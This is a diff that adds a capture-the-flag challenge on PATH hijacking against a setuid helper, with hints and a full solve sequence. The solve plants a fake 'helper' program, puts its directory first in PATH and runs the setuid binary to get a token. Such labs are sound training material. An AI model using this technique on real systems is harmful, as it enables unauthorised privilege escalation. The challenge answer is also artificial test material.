@@ -1,0 +1,16 @@
+Challenge 09 - PATH hijacking
+
+Goal: Trick the setuid helper into running your own program.
+
+Hints:
+- /challenge/runme executes a program named "helper" using PATH.
+- Create ~/bin/helper and prepend ~/bin to PATH.
+- The helper should print the token.
+
+Solve:
+mkdir -p ~/bin
+printf '#!/usr/bin/env bash\necho token-09-path\n' > ~/bin/helper
+chmod +x ~/bin/helper
+export PATH="$HOME/bin:$PATH"
+/challenge/runme
+cat /tmp/token.txt | readflag
